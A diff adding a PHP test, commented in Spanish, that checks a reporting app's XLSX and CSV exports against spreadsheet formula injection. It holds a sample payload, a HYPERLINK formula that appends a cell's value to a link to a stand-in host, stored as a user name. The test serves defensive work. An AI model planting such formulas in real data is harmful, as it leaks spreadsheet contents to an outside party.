@@ -563,6 +563,43 @@ describe('exportaciones', function () {
             ->and($admin[2][6])->toBe('275,00');
     });
 
+    it('nunca escribe fórmulas con los nombres que escribe cualquiera (inyección de fórmulas)', function () {
+        // Cualquiera puede cambiarse el nombre desde su perfil. Una persona de Diseño y un cliente
+        // con nombres que una hoja de cálculo ejecutaría como fórmulas.
+        $formula = '=HYPERLINK("https://x.test/?"&C2,"Ana")';
+        $this->luis->update(['name' => $formula]);
+        $this->tmClient->update(['name' => '@SUM(1+1)']);
+
+        $content = $this->actingAs($this->admin)
+            ->get("/informes/departamentos/{$this->design->id}".($this->week)(['formato' => 'xlsx']))
+            ->assertOk()->streamedContent();
+        $path = tempnam(sys_get_temp_dir(), 'r1').'.xlsx';
+        file_put_contents($path, $content);
+        $zip = new ZipArchive;
+        $zip->open($path);
+        $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
+        $zip->close();
+        unlink($path);
+
+        // Ninguna fórmula (<f>): el nombre es una celda de texto (inlineStr), tal cual.
+        expect($sheet)->not->toContain('<f>')
+            ->and($sheet)->toContain('<c r="A2" s="0" t="inlineStr"><is><t>'.htmlspecialchars($formula, ENT_QUOTES | ENT_XML1).'</t></is></c>')
+            ->and(($this->xlsx)($content)[1][0])->toBe($formula);
+
+        // En el CSV no hay tipos: el texto lleva delante un apóstrofo y la hoja lo trata como texto.
+        $members = ($this->csv)($this->actingAs($this->admin)
+            ->get("/informes/departamentos/{$this->design->id}".($this->week)(['formato' => 'csv']))
+            ->streamedContent());
+        $clients = ($this->csv)($this->actingAs($this->admin)
+            ->get('/informes/direccion'.($this->week)(['formato' => 'csv', 'tabla' => 'clientes']))
+            ->streamedContent());
+
+        expect($members[1][0])->toBe("'".$formula)
+            ->and($clients[2][0])->toBe("'@SUM(1+1)")
+            // Las cifras negativas siguen siendo números, sin apóstrofo.
+            ->and($clients[4][7])->toBe('-30,00');
+    });
+
     it('un formato desconocido enseña la página', function () {
         $this->actingAs($this->admin)
             ->get('/informes/direccion?formato=pdf')
